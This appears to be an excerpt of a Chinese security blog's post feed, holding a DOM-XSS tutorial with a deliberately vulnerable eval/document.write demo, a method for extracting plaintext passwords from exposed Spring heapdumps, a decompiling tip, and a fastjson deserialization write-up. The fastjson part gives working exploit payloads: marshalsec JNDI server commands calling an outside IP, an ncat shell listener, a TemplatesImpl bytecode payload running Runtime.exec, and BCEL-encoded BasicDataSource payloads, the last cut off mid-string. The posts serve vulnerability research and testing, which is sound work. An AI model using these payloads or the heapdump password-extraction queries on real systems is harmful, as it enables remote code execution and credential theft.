+    <content><![CDATA[<h2 id="起源"><a href="#起源" class="headerlink" title="起源"></a>起源</h2><p>近期一起与Camaro师傅做项目，发现他对domxss有很深入的研究（前端之父），顺便学习讨论了一下，写点博客记录一下心得。Dom可以简单理解为html的节点，当前端参数可控制、并且可影响节点时候，形成domxss。<br>通常来讲domxss是属于前端的漏洞，通过前端的javascript代码获取传入的变量，形成xss漏洞。特点：不会与后端服务器进行交互。DOM XSS有何不同？我们可以观察到：<br>HTML页面是静态的，并且与其他类型的XSS攻击一样，页面源代码中没有嵌入任何恶意脚本。<br>如果使用＃字符，脚本代码将永远不会到达服务器。它被视为一个片段，浏览器不会转发它。因此，服务器端攻击检测工具将无法检测到此攻击。这里抛出一个疑问：如果一段domxss的payload可以保存在前端，并且储存到数据库中。比如在留言的地方插入domxss-payload，那么当我们点击这个留言的时候触发domxss，我们是否可以称它为存储型domxss呢？是不是颠覆了大家对xss的分类和认知了？–通常domxss被称为“javascript中输出数据到HTML页面”domxss，domxss的分类在我眼里一直是一个谜。</p>
+<h2 id="挖掘"><a href="#挖掘" class="headerlink" title="挖掘"></a>挖掘</h2><p>domxss漏洞审计三步骤：漏洞的挖掘方式一般是从输入源或者输出点进行审计。通常我们是打开控制台，在console中对可以的关键函数进行输出，查看参数值是否可被控制，打断点进行调试。<br>分析domxss的三大步骤：<br>输入源-编码-输出点<br>1.输入源(sources)：<br>location.href<br>lcoation.hash<br>location.search</p>
+<p>三个函数的作用域</p>
+<p><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2021/02/22/16139858968246.jpg" alt="-w773"></p>
+<p>2.编码：<br>js对文字进行编码涉及3个函数：escape,encodeURI,encodeURIComponent，相应3个解码函数：unescape,decodeURI,decodeURIComponent</p>
+<p>3.输出点(sinks)：<br>eval()、setTimeout()、setInterval()、Function()、innerHTML、document.write()<br>.innerHTML、.outerHTML<br>.append 等</p>
+<hr>
+<blockquote>
+</blockquote>
+<p>输入点：<br>document.location<br>document.URL<br>document.URLUnencoded<br>document.referrer<br>window.location（href hash）<br>所有的inputs<br>window.name<br>document.cookie<br>XMLhttpRequest<br>localstorage</p>
+<blockquote>
+<p>输出点：<br>document.write()<br>document.writeln()<br>xxx.innerHTML=<br>xxx.outerHTML=<br>innerHTML.replace=<br>document.attachEvent()<br>window.attachEvent()<br>document.location.replace()<br>document.location.assign()<br>document.domain<br>someDOMElement.insertAdjacentHTML<br>someDOMElement.onevent</p>
+</blockquote>
+<h2 id="栗子"><a href="#栗子" class="headerlink" title="栗子"></a>栗子</h2><p>将下述代码保存为domxss.html</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;a href&#x3D;&quot;?name&#x3D;1&quot; &#x2F;&gt;</span><br><span class="line">    name 的值   </span><br><span class="line">    &lt;script&gt;</span><br><span class="line"></span><br><span class="line">    function GetRequest() &#123;</span><br><span class="line">        var url &#x3D; location.search; &#x2F;&#x2F;获取url中&quot;?&quot;符后的字串</span><br><span class="line">        var theRequest &#x3D; new Object();</span><br><span class="line">        if (url.indexOf(&quot;?&quot;) !&#x3D; -1) &#123;</span><br><span class="line">            var str &#x3D; url.substr(1);</span><br><span class="line">            strs &#x3D; str.split(&quot;&amp;&quot;);</span><br><span class="line">            for(var i &#x3D; 0; i &lt; strs.length; i ++) &#123;</span><br><span class="line">                theRequest[strs[i].split(&quot;&#x3D;&quot;)[0]]&#x3D;decodeURI(strs[i].split(&quot;&#x3D;&quot;)[1]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return theRequest;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;调用</span><br><span class="line">    var Request &#x3D; new Object();</span><br><span class="line">    Request &#x3D; GetRequest();</span><br><span class="line">    var name;</span><br><span class="line">    name &#x3D; Request[&#39;name&#39;];</span><br><span class="line">    document.write(eval(name))  </span><br><span class="line">    &lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>输入domxss.html?name=javascript:alert(1) 成功弹框<br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2021/02/22/16139813417431.jpg" alt="-w902"></p>
+<p>我们对关键代码进行分析：</p>
+<pre><code>var url = location.search
+var name;
+name = Request[&apos;name&apos;];
+document.write(eval(name))  </code></pre><p>从浏览器获取name的值，然后重新赋值给新变量name，然后使用eval语句直接输出。eval函数可以直接执行javascript代码，所以我们输入name=javascript:alert(1)成功弹框。在上述代码中，输入源（sources）是location.search，输出点（sinks）是document.write。所以大家在做domxss漏洞挖掘的时候可以重点先关注“关键字”进行审计，如上述说的location.search等。<br>重点关键字表格如下：<br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2021/02/22/16139826344907.jpg" alt="-w1368"></p>
+<p>获取参数主要方法<br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2021/02/22/16139847616990.jpg" alt="-w631"></p>
+<p>关于漏洞修复可以看<a href="https://security.jd.com/#/safetyResearch/219" target="_blank" rel="noopener">DOM-XSS漏洞挖掘</a>这部分</p>
+<p>最后大家可以关注一些浏览器特性，还有就是“通过web唤起APP的操作也是越来越多，跳转的协议也是多种多样，例如 webview:// , myappbridge:// 等等。 仅仅使用 http 和 https 来判断URL是否合法已经不适用了，于是由跳转所产生的DOM-XSS漏洞也逐渐增多”</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://portswigger.net/web-security/cross-site-scripting/dom-based" target="_blank" rel="noopener">DOM-based XSS</a><br><a href="https://security.jd.com/#/safetyResearch/219" target="_blank" rel="noopener">DOM-XSS漏洞挖掘</a><br><a href="https://blog.th3wind.xyz/posts/1832779944.html" target="_blank" rel="noopener">DOM XSS从javascript中输出数据到HTML页面</a><br><a href="https://portswigger.net/web-security/cross-site-scripting/dom-based#which-sinks-can-lead-to-dom-xss-vulnerabilities" target="_blank" rel="noopener">DOM-xss列表</a></p>
+]]></content>
+      <categories>
+        <category>xss</category>
+      </categories>
+      <tags>
+        <tag>xss</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MAT 查找 spring heapdump 中的密码明文</title>
+    <url>/2020/08/25/SpringBootHeapdump/</url>
+    <content><![CDATA[<h2 id="前景"><a href="#前景" class="headerlink" title="前景"></a>前景</h2><p>访问 /env 接口时，spring actuator 会将一些带有敏感关键词 (如 password、secret) 的属性名对应的属性值用 <strong>**</strong> 号替换，以达到脱敏的效果。<br>在目标既不出网，/jolokia 接口又没有合适的 MBean 或者不支持 POST 请求的情况下，很多获取被星号脱敏的密码的明文的方法就失效了。<br>这时候就可以利用 Eclipse Memory Analyzer 工具来分析 /heapdump 或 /actuator/heapdump 接口下载的 jvm heap 信息，查找密码明文。</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>1 直接下载<strong><a href="http://xx.xx.xx.xx/heapdump" target="_blank" rel="noopener">http://xx.xx.xx.xx/heapdump</a></strong> 或者<strong><a href="http://xx.xx.xx.xx/actuator/heapdump" target="_blank" rel="noopener">http://xx.xx.xx.xx/actuator/heapdump</a></strong> (spring2.x 修改了路径)</p>
+<p>2 这时候就可以利用 Eclipse Memory Analyzer 工具来分析 /heapdump 或 /actuator/heapdump 接口下载的 jvm heap 信息，查找密码明文</p>
+<p>3 使用<a href="https://www.o2oxy.cn/wp-content/uploads/2020/05/MemoryAnalyzer.zip" target="_blank" rel="noopener"> Eclipse Memory Analyzer</a> 直接打开下载的 heapdump 文件，点击 OQL 标签，在查询框中输入,再点击感叹号运行下列语句。前者Spring1.x 后者Spring2.x</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from org.springframework.web.context.support.StandardServletEnvironment</span><br><span class="line">或者</span><br><span class="line">select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))</span><br></pre></td></tr></table></figure>
+<p>4 成功查询到密码，结合/env页面泄漏的信息可以知道是jdbc还是邮箱的密码等<br><img src="https://mwebkeyi.oss-cn-beijing.aliyuncs.com/2020/08/25/15983217624960.jpg" alt="-w1187"></p>
+<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>1 select语句中的关键字password替换为其他mail关键字进行fuzz</p>
+<p>2 heapdump 泄漏的反序列化点是否可以被我们黑盒利用</p>
+<p>3 可以结合/env页面泄漏的信息猜测其他敏感内容rce，比如sso的ak和sk等</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://fanyibo2009.github.io/" target="_blank" rel="noopener">欢迎查看无尾熊blog</a><br><a href="http://vulsee.com/archives/vulsee_2020/0807_11841.html" target="_blank" rel="noopener">spring boot 获取被星号脱敏的密码的明文</a><br><a href="https://mp.weixin.qq.com/s/YirHAXg3VZXA3Znj4L6xSw" target="_blank" rel="noopener">xray社区记一次信息泄漏到RCE</a></p>
+]]></content>
+      <categories>
+        <category>代码</category>
+      </categories>
+      <tags>
+        <tag>黑盒测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>批量反编译class</title>
+    <url>/2017/05/26/fanbianiyi/</url>
+    <content><![CDATA[<p><strong>使用<a href="http://the.bytecode.club/fernflower.jar" target="_blank" rel="noopener">fernflower.jar</a> 批量反编译class</strong></p>
+<p><strong>批量反编译</strong></p>
+<ul>
+<li>首先把工程的所有class压缩成classes.zip</li>
+<li>java -jar fernflower.jar classes.zip zzCode/  （新建zzCode文件夹） </li>
+</ul>
+]]></content>
+      <categories>
+        <category>反编译</category>
+      </categories>
+      <tags>
+        <tag>java反编译工具</tag>
+        <tag>fernflower.jar</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>fastjson黑盒测试与白盒审计</title>
+    <url>/2020/08/03/fastjson/</url>
+    <content><![CDATA[<h2 id="简介与漏洞史"><a href="#简介与漏洞史" class="headerlink" title="简介与漏洞史"></a>简介与漏洞史</h2><p>文章首发<a href="https://xz.aliyun.com/t/7104" target="_blank" rel="noopener">先知</a></p>
+<pre><code>java处理JSON数据有三个比较流行的类库，gson(google维护)、jackson、以及今天的主角fastjson，
+fastjson是阿里巴巴一个开源的json相关的java library，
+地址在这里，https://github.com/alibaba/fastjson，
+Fastjson可以将java的对象转换成json的形式，也可以用来将json转换成java对象，效率较高，被广泛的用在web服务以及android上，
+它的JSONString（）方法可以将java的对象转换成json格式，同样通过parseObject方法可以将json数据转换成java的对象.</code></pre><h3 id="fastjson漏洞历史"><a href="#fastjson漏洞历史" class="headerlink" title="fastjson漏洞历史"></a>fastjson漏洞历史</h3><p><strong>fastjson-1.2.24</strong><br>(fastjson接受的JSON可以通过<code>@type</code>字段来指定该JSON应当还原成何种类型的对象，在反序列化的时候方便操作)<br><strong>fastjson-1.248以下</strong><br>(从而导致checkAutoType在检测是否为黑名单的时候绕了过去，因为上一步将com.sun.rowset.JdbcRowSetImpl放入了mapping中，checkAutoType中使用TypeUtils.getClassFromMapping(typeName)去获取class不为空，从而绕过了黑名单检测)<br><strong>fastjson-1.2.60以下</strong><br>(在此版本以下，字符串中包含\x转义字符时可以造成dos漏洞)</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="本地测试环境"><a href="#本地测试环境" class="headerlink" title="本地测试环境"></a>本地测试环境</h3><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200113210627-8213791a-3605-1.jpg" alt=""><br>    本地的版本java版本为1.8.0_181<br>   fastjson版本为1.2.24<br>   tomcat 版本为 7</p>
+<p> 然而从JDK 6u45、7u21开始，java.rmi.server.useCodebaseOnly 的默认值就是true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前VM的java.rmi.server.codebase 指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。</p>
+<p><strong>安全版本</strong><br><code>JDK</code>（ 8u121, 7u131, 6u141 ）<br><code>RMI</code>(JDK 6u132, 7u122, or 8u113 )</p>
+<h3 id="fastjson两种利用方式-出网或者不能出网"><a href="#fastjson两种利用方式-出网或者不能出网" class="headerlink" title="fastjson两种利用方式 - 出网或者不能出网"></a>fastjson两种利用方式 - 出网或者不能出网</h3><p><strong>1.服务器出网</strong><br>   使用<code>jndi</code>注入<br>-<code>ldap
+-</code>rmi<br> ** 2.服务器不能出网**<br>   直接本地反序列化<br>-<code>BasicDataSource</code>(tomcat-dbcp:7.x, tomcat-dbcp:9.x, commons-dbcp:1.4)<br>-<code>TemplatesImpl</code></p>
+<h4 id="出网"><a href="#出网" class="headerlink" title="出网"></a>出网</h4><p>  <code>jndi</code>利用，其中分为rmi或者ldap,使用ldap限制比rmi小</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rmi利用</span><br><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http:&#x2F;&#x2F;x.x.x.x&#x2F;#Poc&quot; 9999</span><br><span class="line"></span><br><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http:&#x2F;&#x2F;40.73.6.221:8080&#x2F;#Poc&quot; 9999</span><br><span class="line"></span><br><span class="line">python -m SimpleHTTPServer 80</span><br><span class="line">ncat –lvvp 9998</span><br><span class="line">Burp发送poc</span><br></pre></td></tr></table></figure>
+<p><strong>图三是获取shell</strong><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200113210628-82a86de0-3605-1.jpg" alt=""></p>
+<h4 id="不能出网"><a href="#不能出网" class="headerlink" title="不能出网"></a>不能出网</h4><p><strong>1.直接反序列化-_bytecodes直接反序列化Poc</strong></p>
+<pre><code>JSON.parseObject(input, Object.class, Feature.SupportNonPublicField);com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl中_bytecodes却是私有属性，_name也是私有域，所以在parseObject的时候需要设置Feature.SupportNonPublicField，这样_bytecodes字段才会被反序列化。_tfactory这个字段在TemplatesImpl既没有get方法也没有set方法而大部分的开发可能用用JSON.parse(input)就了事儿了，同时使用了parseObject和Feature.SupportNonPublicField设置的估计不多。所以说实际环境中挖掘fastjson的这个漏洞应该是可遇不可求</code></pre><blockquote>
+<p>利用代码如下：</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&quot;_bytecodes&quot;:[&quot;poc.class_base64&quot;],&#39;_name&#39;:&#39;a.b&#39;,&#39;_tfactory&#39;:&#123; &#125;,&quot;_outputProperties&quot;:&#123;&#125;,&quot;_name&quot;:&quot;a&quot;,&quot;_version&quot;:&quot;1.0&quot;,&quot;allowedProtocols&quot;:&quot;all&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>具体Poc.java代码如下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class Poc extends AbstractTranslet &#123;</span><br><span class="line">public Poc() throws IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(&quot;open &#x2F;System&#x2F;Applications&#x2F;Calculator.app&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] haFndlers) throws TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Poc t &#x3D; new Poc();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先编译poc得到字节码，然后用pyhton进行编码生成byte后的代码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import base64</span><br><span class="line">fin &#x3D; open(r&quot;Poc.class&quot;, &quot;rb&quot;)</span><br><span class="line">fout &#x3D; open(r&quot;en1.txt&quot;, &quot;w&quot;)</span><br><span class="line">s &#x3D; base64.encodestring(fin.read()).replace(&quot;\n&quot;, &quot;&quot;)</span><br><span class="line">fout.write(s)</span><br><span class="line">fin.close()</span><br><span class="line">fout.close()</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Poc1.class进行base64并且要替换换行’\n’, 后代码如下</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yv66vgAAADQAJgoABwAXCgAYABkIABoKABgAGwcAHAoABQAXBwAdAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHAB4BAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAfAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHACABAApTb3VyY2VGaWxlAQALcG9jMTExLmphdmEMAAgACQcAIQwAIgAjAQAMdG91Y2ggL3RtcC8xDAAkACUBAAZQb2MxMTEBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAHAAAAAAAEAAEACAAJAAIACgAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQALAAAADgADAAAACQAEAAoADQALAAwAAAAEAAEADQABAA4ADwABAAoAAAAZAAAABAAAAAGxAAAAAQALAAAABgABAAAADgABAA4AEAACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAAEQAMAAAABAABABEACQASABMAAgAKAAAAJQACAAEAAAAJuwAFWbcABlexAAAAAQALAAAACgACAAAAFAAIABUADAAAAAQAAQAUAAEAFQAAAAIAFg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
+
+
+<blockquote>
+<p>最终poc</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&quot;_bytecodes&quot;:[&quot;yv66vgAAADQAJgoABwAXCgAYABkIABoKABgAGwcAHAoABQAXBwAdAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHAB4BAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAfAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHACABAApTb3VyY2VGaWxlAQAIUG9jLmphdmEMAAgACQcAIQwAIgAjAQAob3BlbiAvU3lzdGVtL0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcAwAJAAlAQADUG9jAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAAAuAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAEACwAAAA4AAwAAAAsABAAMAA0ADQAMAAAABAABAA0AAQAOAA8AAQAKAAAAGQAAAAQAAAABsQAAAAEACwAAAAYAAQAAABEAAQAOABAAAgAKAAAAGQAAAAMAAAABsQAAAAEACwAAAAYAAQAAABYADAAAAAQAAQARAAkAEgATAAIACgAAACUAAgACAAAACbsABVm3AAZMsQAAAAEACwAAAAoAAgAAABkACAAaAAwAAAAEAAEAFAABABUAAAACABY&#x3D;&quot;],&#39;_name&#39;:&#39;a.b&#39;,&#39;_tfactory&#39;:&#123; &#125;,&quot;_outputProperties&quot;:&#123;&#125;,&quot;_name&quot;:&quot;a&quot;,&quot;_version&quot;:&quot;1.0&quot;,&quot;allowedProtocols&quot;:&quot;all&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p><strong>关键调用链如下</strong><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200113210630-83b6d546-3605-1.jpg" alt=""></p>
+<p><strong>命令执行如下</strong><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200113210631-84d0a466-3605-1.jpg" alt=""></p>
+<p><strong>2.直接反序列化-dbcp</strong><br>依赖<br><code>commons-dbcp.jar</code><br>org.apache.commons.dbcp.BasicDataSource<br>Spring在第三方依赖包中包含了两个数据源的实现类包，其一是Apache的DBCP.</p>
+<p>依赖<code>tomcat-dbcp.jar</code>(tomcat部署自带)<br>org.apache.tomcat.dbcp.dbcp.BasicDataSource</p>
+<p>运行Poc1得到<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200113210632-85132278-3605-1.jpg" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$adR$ddj$TA$Y$3d$93$a4$d9d$bbmMc$5bS$ffZ$b5$9az$d1A$f0F$ob$b1$8a$85$d4$96$s$u$d2$ab$c9fLGvg$c2$ecD$82$P$e4$bd7V$U$7c$A$lJ$fcv$8dI$c0$80$V$dce$e6$9b9$7b$ce$f7$bb$df$7f$7c$f9$G$e0$3en$fb$f0$b0$e6$e3$Sj$r$ac$a7$f6$b2$87$x$3e$e6$b0$e6$e1$wC$f1$a1$d2$ca$3db$c8$d7$b7_2$U$9e$98$aedXj$w$z_$M$e2$8e$b4m$d1$89$I$f1$9f$OC$d9w$ca$e8$c4$c35$86$b2$b3B$to$8c$8d$Z$3e$d4$9b$a1$89y2$d0$dc$d8$k$X$7d$R$9eJ$3e$U$91$d0$5ci$t$ad$W$R$l$s$91$L$f9$de$e1Ac$s9$8e$s$d4$ae$8b$f9$5e$fb$60w$a8$92$7d$82$843$f6$ef$a2DZ$r$o$f5$5eZ$de$g$jE$9a$ees$a1$bb$91$b4$8d$b4$3a$fbo$89$9e$fc$87$a0$k$aeSWc$a14$c3j$fd$a4$f9V$bc$T$9c$e2$f5x$cbY$a5$7b$Ze$83$fa$db2$D$h$cag$wmv$e9$c8$84$3b$v3$40$Je$P$9b$Bn$e0$sC$e0$cc$m$3c$dd$e0$$$ee$f3$7b$Bna$8b$e6F$5c$86$c7$e7$ad$cb$O$b4S$b1$e4$bb$9d$84$s$Y$bav$3a$c6H$3a$86j$96$9a2$7c$ffp$3ck$86$H$e7u$fc$db$d1$94$b6$3a$vv$K$adL$d0$e3_$c9P$f5$3d$e9$c6$97$95$fav$f3$PN$83$ba$u$87$92J$bdS$9f$d1$c4$v$e8$c8$9aP$sI$D$9b$f4$93$7bH$9f$CX$daH$e4$e0$d3m$87$y$p$bbx$f7$M$ec3r$cb$f9O$u$bc$faH$I$c3$7c$8a$pO$fb$3c$a9$C$y$d0$h$8c$3c$y$d0Z$c4$S$ed$a9$97Z$86$92f$o$yfn$x$Z$ed$c2$uXJ$cb$cf$a2$ad$8e$fdV$u$b3eTG$82$z$b29$b2$e5$af$98$7b$7d$86bs$o$f4$b3$P5$we$7d$y$beHk$85$ce9$ac$fe$E$i$98$ab$f0$f4$D$A$A</span><br></pre></td></tr></table></figure>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200113210632-8558b478-3605-1.jpg" alt=""></p>
+<p>最终poc</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;&#125;,&#123;&quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;,&quot;driverClassLoader&quot;: &#123;&quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;&#125;,&quot;driverClassName&quot;: &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$7d$91$cfN$C1$Q$c6$bf$c2$$$c5$ba$C$o$e2$3fD$b8$n$HI$bcJ$bc$YM$d0U$P$Q$8e$seidq$dd$dd$y$8b$f1$8d$3csQ$e3$c1$H$f0$a1$8c$b3$F5$5el$d2$99$ce7$9d_$a7$ed$c7$e7$db$3b$80C$d4$F$b2$d801$li$81Mlql$L$98$d8$e1$a8p$ec2d$da$ae$ef$c6$c7$M$e9$c6$7e$9f$c18$J$86$8a$no$bb$be$ba$9a$de$PT$d4$93$D$8f$94$a2$j8$d2$eb$cb$c8M$e2$85h$c4$pw$c2$c0$ed$89$a7Tx$c4$90m$3b$de$82$c7$u_$b3$c7$f2A$b6$3c$e9$df$b6$3a$7e$ac$a2h$g$c6jx$fa$e8$a80v$D$9f$wV$ba$b1t$ee$$e$a8$91$d4$j$83$e8$G$d3$c8Qgnr$84$d0$e8$83$84ca$J$82$a3j$a1$82$3d$86$ea$ffl$L5$I$GS$d73$U$7ew_$P$c6$ca$89$ffH$bdQ$a4$e4$90$$$d48O$5e$n$lF$ae$l$eb$cez$91t$U$ea$e0$f4$94$c9H$81$rm$90$5d$a6$a8E$9e$917$9b$_$603$9d$b6$c8f$b4H$97$pk$cd7$m$87$3c$f9$y$K$3f$c57$g$G$e4KH$bd$c2xB$f6$a2$f9$8c$ccL$8b$Z$3a$c5DZ$e3$caH$fe$d0$m$8dkU$d0$wG$a8o$bc$a0$dc$w$8a$U$ad$d1$e4Hu8J$G$r$d6uG$e5$_$H$X$vT$R$C$A$A&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;&#125;,&#123;&quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;,&quot;driverClassLoader&quot;: &#123;&quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;&#125;,&quot;driverClassName&quot;: 